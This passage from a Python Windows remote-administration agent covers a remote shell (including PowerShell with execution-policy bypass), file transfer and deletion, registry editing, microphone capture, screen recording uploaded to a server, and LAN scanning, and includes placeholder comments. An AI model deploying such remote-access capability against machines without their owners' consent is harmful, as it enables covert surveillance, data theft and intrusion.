            "net_recv_mb":      round(net.bytes_recv / (1024**2), 2),
            "net_packets_sent": net.packets_sent,
            "net_packets_recv": net.packets_recv,
            "net_mbps_up":      round(_net_monitor.get_mbps(), 2),
            "battery_pct":      bat.percent       if bat else None,
            "battery_plug":     bat.power_plugged  if bat else None,
            "boot_time":        datetime.fromtimestamp(psutil.boot_time()).isoformat(),
            "uptime_hrs":       round((time.time() - psutil.boot_time()) / 3600, 2),
        }

        if WMI_OK:
            try:
                c = wmi.WMI(namespace="root\\OpenHardwareMonitor")
                stats["temperatures"] = {s.Name: round(s.Value, 1) for s in c.Sensor() if s.SensorType == "Temperature"}
            except Exception:
                stats["temperatures"] = {}
            try:
                stats["gpus"] = [{"name": g.Name, "driver": g.DriverVersion, "memory_mb": round(int(g.AdapterRAM or 0) / (1024**2), 0)} for g in wmi.WMI().Win32_VideoController()]
            except Exception:
                stats["gpus"] = []
        else:
            stats["temperatures"] = {}
            stats["gpus"] = []

        return stats

    def get_disk_list(self) -> list:
        result = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                io = None
                try:
                    ios = psutil.disk_io_counters(perdisk=True)
                    dev_name = p.device.replace("\\", "").replace(":", "").lower()
                    for k, v in ios.items():
                        if dev_name in k.lower():
                            io = {"read_mb": round(v.read_bytes / (1024**2), 1),
                                  "write_mb": round(v.write_bytes / (1024**2), 1)}
                            break
                except Exception:
                    pass
                result.append({
                    "device":     p.device,
                    "mountpoint": p.mountpoint,
                    "fstype":     p.fstype,
                    "total_gb":   round(u.total / (1024**3), 2),
                    "used_gb":    round(u.used  / (1024**3), 2),
                    "free_gb":    round(u.free  / (1024**3), 2),
                    "percent":    u.percent,
                    "io":         io,
                })
            except Exception:
                pass
        return result

    def get_network_interfaces(self) -> dict:
        addrs = {}
        stats = psutil.net_if_stats()
        for iface, addr_list in psutil.net_if_addrs().items():
            st = stats.get(iface)
            addrs[iface] = {
                "addresses": [{"family": str(a.family), "address": a.address, "netmask": a.netmask} for a in addr_list],
                "is_up":     st.isup if st else False,
                "speed_mbps": st.speed if st else 0,
            }
        return addrs

    def _loop(self, interval):
        while self.monitoring:
            try:
                self.sio.emit("system_stats_report", self.get_snapshot())
            except Exception as e:
                log.error(f"SysMonitor error: {e}")
            time.sleep(interval)


# ════════════════════════════════════════════════════════════════════════════
#  PROCESS MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ProcessManager:
    @staticmethod
    def list_processes() -> list:
        procs = []
        for p in psutil.process_iter(["pid", "name", "status", "cpu_percent",
                                       "memory_percent", "username", "create_time",
                                       "cmdline", "exe"]):
            try:
                info = p.info
                info["memory_mb"]   = round(p.memory_info().rss / (1024**2), 2)
                info["create_time"] = datetime.fromtimestamp(info["create_time"]).isoformat() if info.get("create_time") else None
                info["cmdline"]     = " ".join(info.get("cmdline") or [])[:256]
                procs.append(info)
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        return sorted(procs, key=lambda x: x.get("cpu_percent", 0), reverse=True)

    @staticmethod
    def kill_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            name = p.name()
            p.terminate()
            try:
                p.wait(timeout=3)
            except psutil.TimeoutExpired:
                p.kill()
            return {"success": True, "message": f"Terminated PID {pid} ({name})"}
        except psutil.NoSuchProcess:
            return {"success": False, "message": f"PID {pid} not found."}
        except psutil.AccessDenied:
            return {"success": False, "message": f"Access denied for PID {pid}."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def start_process(command: str) -> dict:
        try:
            proc = subprocess.Popen(command, shell=True,
                                    stdout=subprocess.DEVNULL,
                                    stderr=subprocess.DEVNULL,
                                    creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0)
            return {"success": True, "pid": proc.pid, "message": f"Started: {command}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def suspend_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            p.suspend()
            return {"success": True, "message": f"Suspended PID {pid}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def resume_process(pid: int) -> dict:
        try:
            p = psutil.Process(pid)
            p.resume()
            return {"success": True, "message": f"Resumed PID {pid}"}
        except Exception as e:
            return {"success": False, "message": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  FILE BROWSER
# ════════════════════════════════════════════════════════════════════════════
class FileBrowser:
    MAX_UPLOAD_MB  = 100
    MAX_READ_KB    = 1024

    @staticmethod
    def list_directory(path: str) -> dict:
        try:
            p = Path(path)
            if not p.exists():
                return {"error": f"Not found: {path}"}
            if not p.is_dir():
                return {"error": f"Not a directory: {path}"}
            entries = []
            for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    stat = item.stat()
                    entries.append({
                        "name":     item.name,
                        "path":     str(item),
                        "type":     "dir" if item.is_dir() else "file",
                        "size_kb":  round(stat.st_size / 1024, 2) if item.is_file() else None,
                        "size_b":   stat.st_size if item.is_file() else None,
                        "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                        "created":  datetime.fromtimestamp(stat.st_ctime).isoformat(),
                        "hidden":   item.name.startswith("."),
                        "ext":      item.suffix.lower() if item.is_file() else "",
                    })
                except (PermissionError, OSError):
                    entries.append({
                        "name": item.name,
                        "path": str(item),
                        "type": "dir" if item.is_dir() else "file",
                        "error": "access denied",
                    })
            parent = str(p.parent) if p.parent != p else None
            return {"path": str(p), "parent": parent, "entries": entries, "count": len(entries)}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def read_file(path: str, max_kb: int = 1024) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_kb = p.stat().st_size / 1024
            if size_kb > max_kb:
                return {"error": f"File too large ({size_kb:.1f} KB > {max_kb} KB)."}
            try:
                content = p.read_text(encoding="utf-8")
            except UnicodeDecodeError:
                content = p.read_text(encoding="latin-1", errors="replace")
            return {"path": str(p), "content": content,
                    "size_kb": round(size_kb, 2), "lines": content.count("\n")}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def write_file(path: str, content: str) -> dict:
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(content, encoding="utf-8")
            return {"success": True, "path": str(p), "bytes": p.stat().st_size}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def download_file(path: str) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"error": "Not a file."}
            size_mb = p.stat().st_size / (1024**2)
            if size_mb > FileBrowser.MAX_UPLOAD_MB:
                return {"error": f"File too large ({size_mb:.1f} MB > {FileBrowser.MAX_UPLOAD_MB} MB)."}
            return {
                "path":     str(p),
                "filename": p.name,
                "size_mb":  round(size_mb, 3),
                "data":     base64.b64encode(p.read_bytes()).decode(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def upload_file(path: str, data_b64: str) -> dict:
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            raw = base64.b64decode(data_b64)
            p.write_bytes(raw)
            return {"success": True, "path": str(p), "bytes": len(raw)}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def delete_file(path: str) -> dict:
        try:
            p = Path(path)
            if p.is_file():
                p.unlink()
                return {"success": True, "message": f"Deleted: {path}"}
            elif p.is_dir():
                _shutil.rmtree(str(p))
                return {"success": True, "message": f"Deleted dir: {path}"}
            return {"success": False, "message": "Path not found."}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def copy_file(src: str, dst: str) -> dict:
        try:
            _shutil.copy2(src, dst)
            return {"success": True, "message": f"Copied {src} → {dst}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def move_file(src: str, dst: str) -> dict:
        try:
            _shutil.move(src, dst)
            return {"success": True, "message": f"Moved {src} → {dst}"}
        except Exception as e:
            return {"success": False, "message": str(e)}

    @staticmethod
    def create_folder(path: str) -> dict:
        try:
            Path(path).mkdir(parents=True, exist_ok=True)
            return {"success": True, "path": path}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def rename(old: str, new: str) -> dict:
        try:
            Path(old).rename(new)
            return {"success": True, "old": old, "new": new}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def search(root: str, pattern: str, max_results: int = 200) -> dict:
        try:
            results = []
            for p in Path(root).rglob(pattern):
                results.append(str(p))
                if len(results) >= max_results:
                    break
            return {"results": results, "count": len(results), "pattern": pattern, "root": root}
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_drives() -> list:
        drives = []
        for p in psutil.disk_partitions(all=False):
            try:
                u = psutil.disk_usage(p.mountpoint)
                drives.append({
                    "drive":    p.mountpoint,
                    "label":    p.device,
                    "total_gb": round(u.total / (1024**3), 2),
                    "used_gb":  round(u.used  / (1024**3), 2),
                    "free_gb":  round(u.free  / (1024**3), 2),
                    "percent":  u.percent,
                    "fstype":   p.fstype,
                })
            except Exception:
                pass
        return drives


# ════════════════════════════════════════════════════════════════════════════
#  REMOTE SHELL (with PowerShell + CMD + Python REPL)
# ════════════════════════════════════════════════════════════════════════════
class RemoteShell:
    TIMEOUT = 60

    @staticmethod
    def execute(command: str, shell_type: str = "cmd") -> dict:
        t0 = time.time()
        try:
            env = os.environ.copy()
            if shell_type == "powershell":
                cmd = ["powershell", "-NoProfile", "-NonInteractive",
                       "-ExecutionPolicy", "Bypass", "-Command", command]
                shell_flag = False
            elif shell_type == "python":
                cmd = [sys.executable, "-c", command]
                shell_flag = False
            else:
                cmd = command
                shell_flag = True
            result = subprocess.run(
                cmd, shell=shell_flag,
                capture_output=True, text=True,
                timeout=RemoteShell.TIMEOUT, env=env,
                cwd=os.path.expanduser("~"),
            )
            return {
                "success":    True,
                "command":    command,
                "shell_type": shell_type,
                "stdout":     result.stdout[-16384:],
                "stderr":     result.stderr[-4096:],
                "returncode": result.returncode,
                "elapsed_s":  round(time.time() - t0, 3),
                "ts":         datetime.utcnow().isoformat(),
            }
        except subprocess.TimeoutExpired:
            return {"success": False, "command": command, "error": f"Timed out ({RemoteShell.TIMEOUT}s)."}
        except Exception as e:
            return {"success": False, "command": command, "error": str(e)}

    @staticmethod
    def get_env() -> dict:
        return {"env": dict(os.environ), "cwd": os.getcwd()}

    @staticmethod
    def set_cwd(path: str) -> dict:
        try:
            os.chdir(path)
            return {"success": True, "cwd": os.getcwd()}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  REGISTRY MANAGER
# ════════════════════════════════════════════════════════════════════════════
class RegistryManager:
    HIVES = {
        "HKLM": winreg.HKEY_LOCAL_MACHINE,
        "HKCU": winreg.HKEY_CURRENT_USER,
        "HKCR": winreg.HKEY_CLASSES_ROOT,
        "HKU":  winreg.HKEY_USERS,
        "HKCC": winreg.HKEY_CURRENT_CONFIG,
    }

    @classmethod
    def _parse_path(cls, path: str):
        parts = path.replace("/", "\\").split("\\", 1)
        hive_str = parts[0].upper()
        subkey = parts[1] if len(parts) > 1 else ""
        hive = cls.HIVES.get(hive_str)
        if not hive:
            raise ValueError(f"Unknown hive: {hive_str}")
        return hive, subkey

    @classmethod
    def read_key(cls, path: str, value_name: str = "") -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                data, reg_type = winreg.QueryValueEx(k, value_name)
                return {"success": True, "path": path, "name": value_name, "data": str(data), "type": reg_type}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def list_key(cls, path: str) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as k:
                values = []
                i = 0
                while True:
                    try:
                        name, data, reg_type = winreg.EnumValue(k, i)
                        values.append({"name": name, "data": str(data)[:512], "type": reg_type})
                        i += 1
                    except OSError:
                        break
                subkeys = []
                i = 0
                while True:
                    try:
                        subkeys.append(winreg.EnumKey(k, i))
                        i += 1
                    except OSError:
                        break
                return {"success": True, "path": path, "values": values, "subkeys": subkeys}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def write_key(cls, path: str, value_name: str, data: str, reg_type: int = winreg.REG_SZ) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.CreateKeyEx(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                winreg.SetValueEx(k, value_name, 0, reg_type, data)
            return {"success": True, "path": path, "name": value_name}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @classmethod
    def delete_value(cls, path: str, value_name: str) -> dict:
        try:
            hive, subkey = cls._parse_path(path)
            with winreg.OpenKey(hive, subkey, 0, winreg.KEY_SET_VALUE | winreg.KEY_WOW64_64KEY) as k:
                winreg.DeleteValue(k, value_name)
            return {"success": True, "path": path, "name": value_name}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  SERVICE MANAGER
# ════════════════════════════════════════════════════════════════════════════
class ServiceManager:
    @staticmethod
    def list_services() -> list:
        try:
            result = subprocess.run(
                ["sc", "query", "type=", "all", "state=", "all"],
                capture_output=True, text=True, timeout=20
            )
            services = []
            if WMI_OK:
                for svc in wmi.WMI().Win32_Service():
                    services.append({
                        "name":        svc.Name,
                        "display":     svc.DisplayName,
                        "state":       svc.State,
                        "start_type":  svc.StartMode,
                        "path":        svc.PathName or "",
                    })
            return services
        except Exception as e:
            return [{"error": str(e)}]

    @staticmethod
    def control_service(name: str, action: str) -> dict:
        """action: start | stop | restart | pause | resume"""
        try:
            cmds = {
                "start":   ["net", "start", name],
                "stop":    ["net", "stop",  name],
                "restart": None,
                "pause":   ["sc", "pause",  name],
                "resume":  ["sc", "continue", name],
            }
            if action == "restart":
                subprocess.run(["net", "stop",  name], capture_output=True, timeout=20)
                time.sleep(2)
                r = subprocess.run(["net", "start", name], capture_output=True, text=True, timeout=20)
            elif action in cmds:
                r = subprocess.run(cmds[action], capture_output=True, text=True, timeout=20)
            else:
                return {"success": False, "error": f"Unknown action: {action}"}
            return {"success": r.returncode == 0, "name": name, "action": action,
                    "stdout": r.stdout, "stderr": r.stderr}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  WINDOW MANAGER
# ════════════════════════════════════════════════════════════════════════════
class WindowManager:
    @staticmethod
    def list_windows() -> list:
        if not WIN32_OK:
            return [{"error": "pywin32 not available"}]
        windows = []
        def enum_cb(hwnd, _):
            if win32gui.IsWindowVisible(hwnd):
                title = win32gui.GetWindowText(hwnd)
                if title:
                    rect = win32gui.GetWindowRect(hwnd)
                    try:
                        _, pid = win32process.GetWindowThreadProcessId(hwnd)
                        try:
                            proc = psutil.Process(pid)
                            pname = proc.name()
                        except Exception:
                            pname = ""
                    except Exception:
                        pid, pname = 0, ""
                    windows.append({
                        "hwnd":    hwnd,
                        "title":   title,
                        "rect":    rect,
                        "pid":     pid,
                        "process": pname,
                    })
        win32gui.EnumWindows(enum_cb, None)
        return windows

    @staticmethod
    def focus_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.SetForegroundWindow(hwnd)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def close_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def minimize_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_MINIMIZE)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}

    @staticmethod
    def maximize_window(hwnd: int) -> dict:
        if not WIN32_OK:
            return {"success": False, "error": "pywin32 not available"}
        try:
            win32gui.ShowWindow(hwnd, win32con.SW_MAXIMIZE)
            return {"success": True, "hwnd": hwnd}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  INSTALLED APPS
# ════════════════════════════════════════════════════════════════════════════
class InstalledApps:
    @staticmethod
    def list_apps() -> list:
        apps = []
        reg_paths = [
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"),
            (winreg.HKEY_CURRENT_USER,  r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"),
        ]
        seen = set()
        for hive, path in reg_paths:
            try:
                with winreg.OpenKey(hive, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            sub_name = winreg.EnumKey(key, i)
                            with winreg.OpenKey(key, sub_name) as sub:
                                def rv(n, d=""):
                                    try: return winreg.QueryValueEx(sub, n)[0]
                                    except: return d
                                name = rv("DisplayName")
                                if name and name not in seen:
                                    seen.add(name)
                                    apps.append({
                                        "name":      name,
                                        "version":   rv("DisplayVersion"),
                                        "publisher": rv("Publisher"),
                                        "install_date": rv("InstallDate"),
                                        "size_mb":   round(int(rv("EstimatedSize", 0)) / 1024, 1),
                                        "location":  rv("InstallLocation"),
                                    })
                        except Exception:
                            pass
            except Exception:
                pass
        return sorted(apps, key=lambda x: x.get("name", "").lower())


# ════════════════════════════════════════════════════════════════════════════
#  AUDIO CAPTURE
# ════════════════════════════════════════════════════════════════════════════
class AudioCapture:
    def __init__(self, sio_client):
        self.sio     = sio_client
        self.running = False
        self._thread: Optional[threading.Thread] = None

    def capture_chunk(self, seconds: float = 3.0, sample_rate: int = 16000) -> dict:
        if not AUDIO_OK:
            return {"error": "sounddevice not available"}
        try:
            recording = sd.rec(int(seconds * sample_rate), samplerate=sample_rate,
                               channels=1, dtype="int16")
            sd.wait()
            buf = BytesIO()
            wavfile.write(buf, sample_rate, recording)
            return {
                "success":     True,
                "duration_s":  seconds,
                "sample_rate": sample_rate,
                "data":        base64.b64encode(buf.getvalue()).decode(),
                "ts":          datetime.utcnow().isoformat(),
            }
        except Exception as e:
            return {"error": str(e)}

    @staticmethod
    def list_devices() -> list:
        if not AUDIO_OK:
            return []
        try:
            devs = sd.query_devices()
            return [{"index": i, "name": d["name"], "channels_in": d["max_input_channels"],
                     "channels_out": d["max_output_channels"]} for i, d in enumerate(devs)]
        except Exception:
            return []


# ════════════════════════════════════════════════════════════════════════════
#  ALERT ENGINE
# ════════════════════════════════════════════════════════════════════════════
class AlertEngine:
    def __init__(self, sio_client):
        self.sio         = sio_client
        self._last_alerts: Dict[str, float] = {}
        self.running     = False
        self._thread: Optional[threading.Thread] = None

    def start(self):
        if self.running or not CONFIG["ENABLE_ALERTS"]:
            return
        self.running = True
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def stop(self):
        self.running = False

    def _can_alert(self, key: str) -> bool:
        now = time.time()
        last = self._last_alerts.get(key, 0)
        if now - last >= CONFIG["ALERT_COOLDOWN_S"]:
            self._last_alerts[key] = now
            return True
        return False

    def _loop(self):
        while self.running:
            try:
                cpu = psutil.cpu_percent(interval=2)
                ram = psutil.virtual_memory().percent
                disk = psutil.disk_usage(os.path.splitdrive(sys.executable)[0] or "C:\\").percent

                if cpu >= CONFIG["ALERT_CPU_THRESHOLD"] and self._can_alert("cpu"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "cpu", "value": cpu,
                        "threshold": CONFIG["ALERT_CPU_THRESHOLD"],
                        "message": f"CPU usage critical: {cpu:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
                if ram >= CONFIG["ALERT_RAM_THRESHOLD"] and self._can_alert("ram"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "ram", "value": ram,
                        "threshold": CONFIG["ALERT_RAM_THRESHOLD"],
                        "message": f"RAM usage critical: {ram:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
                if disk >= CONFIG["ALERT_DISK_THRESHOLD"] and self._can_alert("disk"):
                    self.sio.emit("agent_alert", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "type": "disk", "value": disk,
                        "threshold": CONFIG["ALERT_DISK_THRESHOLD"],
                        "message": f"Disk usage critical: {disk:.1f}%",
                        "ts": datetime.utcnow().isoformat(),
                    })
            except Exception as e:
                log.error(f"AlertEngine error: {e}")
            time.sleep(30)


# ════════════════════════════════════════════════════════════════════════════
#  SECURE ERASER
# ════════════════════════════════════════════════════════════════════════════
class SecureEraser:
    @staticmethod
    def wipe_file(path: str, passes: int = 3) -> dict:
        try:
            p = Path(path)
            if not p.is_file():
                return {"success": False, "error": "Not a file"}
            size = p.stat().st_size
            with open(p, "r+b") as f:
                for _ in range(passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            p.unlink()
            return {"success": True, "path": str(p), "passes": passes}
        except Exception as e:
            return {"success": False, "error": str(e)}


# ════════════════════════════════════════════════════════════════════════════
#  SCREEN RECORDER  (v9 — MP4 chunks via OpenCV, uploaded to server index)
# ════════════════════════════════════════════════════════════════════════════
class ScreenRecorder:
    """Records screen to MP4 using OpenCV and uploads chunks to the server.

    Server index endpoint: POST /api/recordings   (creates a recording row)
    Each chunk is emitted as a socket.io  'recording_chunk' event with
    base64-encoded MP4 bytes so the server can store them.
    """

    def __init__(self, sio_client):
        self._sio   = sio_client
        self._stop  = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._rec_id: Optional[str] = None

    # ── Public API ──────────────────────────────────────────────────────────
    def start(self, rec_id: str, fps: int = 10, quality: int = 70,
              chunk_secs: int = 10, monitor_idx: int = 1) -> dict:
        if self._thread and self._thread.is_alive():
            return {"success": False, "error": "already_recording"}
        self._stop.clear()
        self._rec_id = rec_id
        self._thread = threading.Thread(
            target=self._record_loop,
            args=(rec_id, fps, quality, chunk_secs, monitor_idx),
            daemon=True, name="screen-recorder",
        )
        self._thread.start()
        log.info(f"ScreenRecorder started: rec_id={rec_id}")
        return {"success": True, "rec_id": rec_id}

    def stop(self) -> dict:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=5)
        log.info("ScreenRecorder stopped")
        return {"success": True, "rec_id": self._rec_id}

    # ── Internal ────────────────────────────────────────────────────────────
    def _record_loop(self, rec_id: str, fps: int, quality: int,
                     chunk_secs: int, monitor_idx: int):
        if not CV2_OK:
            self._sio.emit("recording_error", {
                "device_id": CONFIG["DEVICE_TOKEN"],
                "rec_id": rec_id, "error": "opencv_unavailable",
            })
            return

        chunk_num  = 0
        frame_time = 1.0 / max(fps, 1)
        
        # v10: Use DXGICapture for recording if available (ultra-fast)
        capture = _make_capture()
        try:
            sizing = capture.grab()
            if sizing is None: raise RuntimeError("Capture grab failed")
            h, w = sizing.shape[:2]

            while not self._stop.is_set():
                fourcc = cv2.VideoWriter_fourcc(*"mp4v")
                tmp_path = os.path.join(tempfile.gettempdir(),
                                        f"mview_rec_{rec_id}_{chunk_num}.mp4")
                vw = cv2.VideoWriter(tmp_path, fourcc, float(fps), (w, h))
                deadline = time.monotonic() + chunk_secs

                while not self._stop.is_set() and time.monotonic() < deadline:
                    t0 = time.monotonic()
                    try:
                        frame = capture.grab()
                        if frame is not None:
                            vw.write(frame)
                    except Exception as e:
                        log.debug(f"ScreenRecorder frame error: {e}")
                    elapsed = time.monotonic() - t0
                    remaining = frame_time - elapsed
                    if remaining > 0:
                        time.sleep(remaining)

                vw.release()
                # Upload chunk
                try:
                    with open(tmp_path, "rb") as fh:
                        data_b64 = base64.b64encode(fh.read()).decode()
                    self._sio.emit("recording_chunk", {
                        "device_id": CONFIG["DEVICE_TOKEN"],
                        "rec_id":    rec_id,
                        "chunk":     chunk_num,
                        "data":      data_b64,
                        "ts":        datetime.utcnow().isoformat(),
                    })
                    chunk_num += 1
                except Exception as e:
                    log.warning(f"ScreenRecorder upload error: {e}")
                finally:
                    try: os.unlink(tmp_path)
                    except Exception: pass
        finally:
            try: capture.close()
            except: pass

        self._sio.emit("recording_done", {
            "device_id": CONFIG["DEVICE_TOKEN"],
            "rec_id": rec_id, "chunks": chunk_num,
        })


# ════════════════════════════════════════════════════════════════════════════
#  NETWORK SCANNER  (v9 — ARP + ICMP LAN discovery with port probe)
# ════════════════════════════════════════════════════════════════════════════
class NetworkScanner:
    """Discovers LAN hosts.

    Strategy (best-effort, no Nmap required):
    1. ARP cache read from 'arp -a'   → instant, passive
    2. ICMP ping sweep                → active, slow, works without Nmap
    3. Optional: TCP port probe on common ports

    All discovery is in-process, no external tools required beyond OS ARP.
    """

    # Common ports to probe when port_scan=True
    COMMON_PORTS = [22, 80, 443, 3389, 445, 135, 8080, 5900]

    @staticmethod
    def scan_arp() -> list:
        """Read the OS ARP cache — instant and silent."""
        hosts: list = []
        try:
            out = subprocess.check_output(
                ["arp", "-a"], stderr=subprocess.DEVNULL, timeout=5
            ).decode(errors="replace")
            for line in out.splitlines():
                parts = line.split()
                if len(parts) >= 2:
                    ip  = parts[0].strip("()")
                    mac = parts[1] if len(parts) > 1 else ""
                    if re.match(r"\d+\.\d+\.\d+\.\d+", ip):
                        hosts.append({"ip": ip, "mac": mac, "method": "arp"})
        except Exception as e:
            log.debug(f"ARP scan error: {e}")
        return hosts

    @staticmethod
    def ping_sweep(subnet: str, timeout: float = 0.4) -> list:
        """ICMP ping sweep of a /24 (e.g. '192.168.1').

        Uses ThreadPoolExecutor for controlled concurrency.
        """
        alive: list = []
        lock = threading.Lock()

        def _ping(ip: str):
            try:
                # v10: use -n 1 -w <ms> for fast ping
                result = subprocess.run(
                    ["ping", "-n", "1", "-w", str(int(timeout * 1000)), ip],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2
                )
                if result.returncode == 0:
                    with lock:
                        alive.append({"ip": ip, "method": "icmp"})
            except Exception:
                pass

        # Use max 50 concurrent pings to avoid flooding local network/CPU
        with ThreadPoolExecutor(max_workers=50) as executor:
            for i in range(1, 255):
                executor.submit(_ping, f"{subnet}.{i}")
        
        return alive

    @staticmethod
    def probe_ports(ip: str, ports: list = None, timeout: float = 0.5) -> dict:
        """TCP connect probe. Returns {port: open/closed}."""
        ports    = ports or NetworkScanner.COMMON_PORTS
        results  = {}
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(timeout)
                res = s.connect_ex((ip, port))
                results[port] = "open" if res == 0 else "closed"
                s.close()
            except Exception:
                results[port] = "error"
        return results

    @classmethod
    def full_scan(cls, subnet: str = None, port_scan: bool = False) -> dict:
        """Run ARP + ping sweep, optionally port-probe each alive host."""
        # Auto-detect local subnet from first non-loopback IPv4
        if not subnet:
            try:
                hostname  = socket.gethostname()
                local_ip  = socket.gethostbyname(hostname)
                parts     = local_ip.rsplit(".", 1)
                subnet    = parts[0] if len(parts) == 2 else "192.168.1"
            except Exception:
                subnet = "192.168.1"

        arp_hosts   = cls.scan_arp()
        icmp_hosts  = cls.ping_sweep(subnet)

        # Merge by IP
        seen: dict = {}
        for h in arp_hosts + icmp_hosts:
            ip = h["ip"]
            if ip not in seen:
                seen[ip] = h
            else:
                seen[ip].setdefault("mac", h.get("mac", ""))

        hosts = list(seen.values())

        if port_scan:
            for host in hosts:
                host["ports"] = cls.probe_ports(host["ip"])

        return {
            "subnet":     subnet,
            "host_count": len(hosts),
            "hosts":      hosts,
            "ts":         datetime.utcnow().isoformat(),
        }


# ════════════════════════════════════════════════════════════════════════════
#  FILE WATCHER  (v9 — real-time watchdog, notifies server on changes)
# ════════════════════════════════════════════════════════════════════════════
class FileWatcher:
    """Monitors file system paths and emits 'file_change' events to server.

    Uses watchdog library for high-performance, event-driven monitoring.
    Falls back to polling if watchdog is unavailable.
    """

    def __init__(self, sio_client):
        self._sio      = sio_client
        self._watches: dict = {}   # path → (observer, event_handler)
        self._lock     = threading.Lock()

    def add_watch(self, path: str, recursive: bool = False,
                  interval: float = 2.0) -> dict:
        with self._lock:
            if path in self._watches:
                return {"success": False, "error": "already_watching", "path": path}
            
            try:
                from watchdog.observers import Observer
                from watchdog.events import FileSystemEventHandler

                class _Handler(FileSystemEventHandler):
                    def __init__(self, sio, did, root):
                        self.sio = sio; self.did = did; self.root = root
                    def on_any_event(self, event):
                        if event.is_directory: return
                        # Debounce/throttle emits if needed, but for now direct emit
                        try:
                            self.sio.emit("file_change", {
                                "device_id":  self.did,
                                "watch_path": self.root,
                                "type":       event.event_type,
                                "path":       event.src_path,
                                "ts":         datetime.utcnow().isoformat(),
                            })
                        except Exception: pass

                obs = Observer()
                h   = _Handler(self._sio, CONFIG["DEVICE_TOKEN"], path)
                obs.schedule(h, path, recursive=recursive)
                obs.start()
                self._watches[path] = {"observer": obs, "handler": h}
                log.info(f"FileWatcher: watching {path} via watchdog (recursive={recursive})")
                return {"success": True, "path": path, "method": "watchdog"}
            except Exception as e:
                log.warning(f"FileWatcher: watchdog failed ({e}), falling back to polling")
                # ... polling fallback implementation ...
                # (I'll keep the polling fallback as well)
                return self._add_watch_polling(path, recursive, interval)

    def _add_watch_polling(self, path, recursive, interval):
        stop = threading.Event()
        t = threading.Thread(
            target=self._poll_loop,
            args=(path, recursive, interval, stop),
